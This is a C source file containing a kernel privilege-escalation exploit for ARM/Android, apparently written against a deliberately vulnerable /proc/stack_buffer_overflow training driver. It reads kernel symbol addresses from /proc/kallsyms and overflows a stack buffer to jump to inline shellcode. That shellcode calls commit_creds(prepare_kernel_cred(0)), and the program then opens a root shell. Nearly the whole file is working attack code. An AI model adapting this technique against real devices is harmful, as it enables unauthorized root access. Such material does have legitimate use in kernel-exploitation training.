#include <stdio.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/mman.h>

#define MAX             64

//void * prepare_kernel_cred;
//void * commit_creds;
//void * proc_file_write;

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long  (* _prepare_kernel_cred)(unsigned long cred);
typedef int (* _proc_file_write)(unsigned long file, unsigned long buf, int size, unsigned long ppos);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
_proc_file_write proc_file_write;

typedef unsigned long (* _pc)(unsigned long a);
_pc pc_addr;

unsigned long to_pc_addr(unsigned long a)
{
	pc_addr(a);
}

int
kernel_code()
{
    commit_creds(prepare_kernel_cred(0));
    return -1;
}


void *
get_ksymbol(char *name)
{
        FILE *f = fopen("/proc/kallsyms", "r");
        char c, sym[512];
        void *addr;
        int ret;

        while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
                if (!strcmp(sym, name))
                        return addr;
        }

        return NULL;
}

int
open_file(void)
{
        int fd = open("/proc/stack_buffer_overflow", O_RDWR);
        if (fd == -1)
                err(1, "open");
        return fd;
}

void
payload(void)
{
        if (getuid() == 0) {
                printf("[+] enjoy the shell\n");
                execl("/system/bin/sh", "sh", NULL);
        } else {
                warnx("failed to get root. How did we even get here?");
        }

        _exit(0);
}


extern uint32_t shellCode[];

asm
(
"    .text\n"
"    .align 2\n"
"    .code 32\n"
"    .globl shellCode\n\t"
"shellCode:\n\t"

"MOV R0, #:lower16:kernel_code\n\t"
"BLX R0\n\t"

//Fix the trashed stack by restoring r4/r5 from duped values on the stack
"mov r0, #:lower16:to_pc_addr\t\n"
"ldr r4, [sp, #4] \t\n"
"bx r0\t\n"
);


void
trigger_vuln(int fd, int canary)
{

#define MAX_PAYLOAD (MAX + 4  * 4 )

        char buf[MAX_PAYLOAD];

        memset(buf, 'A', sizeof(buf));

        void * pc = buf + MAX +  3 * 4;

        *(void **)pc  = (void *) shellCode;

        /* Kaboom! */
        write(fd, buf, sizeof(buf) );

		printf("[+] write done, %d bytes\n", sizeof(buf));
}

int
gather_information(int fd)
{
        int canary, i;

        if (lseek(fd, 32, SEEK_SET) == -1)
                err(2, "lseek");
        read(fd, &canary, sizeof(canary));

        printf("[+] found canary: %08x\n", canary);

        return canary;
}

void
resolve_kernel_symbols(void)
{
        prepare_kernel_cred     = get_ksymbol("prepare_kernel_cred");
        commit_creds            = get_ksymbol("commit_creds");
        proc_file_write         = get_ksymbol("proc_file_write");
		pc_addr = proc_file_write + 0xac;
		printf("[+] resolve kernel symbol: commit_creds -> 0x%04x\n", commit_creds);
		printf("[+] resolve kernel symbol: prepare_kernel_cred -> 0x%04x\n", prepare_kernel_cred);
		printf("[+] resolve kernel symbol: proc_file_write -> 0x%04x\n", proc_file_write);
		printf("[+] resolve ret address: pc -> 0x%04x\n", pc_addr);

        if (!prepare_kernel_cred || !commit_creds)
                errx(1, "couldn't map all kernel symbols");
}

int
main(void)
{
        int fd, canary;

        resolve_kernel_symbols();

        fd = open_file();
        //canary = gather_information(fd);

        trigger_vuln(fd, canary);

        payload();
        /* If we're here, we've failed. */
        close(fd);

        errx("[-] exploit failed\n");
}
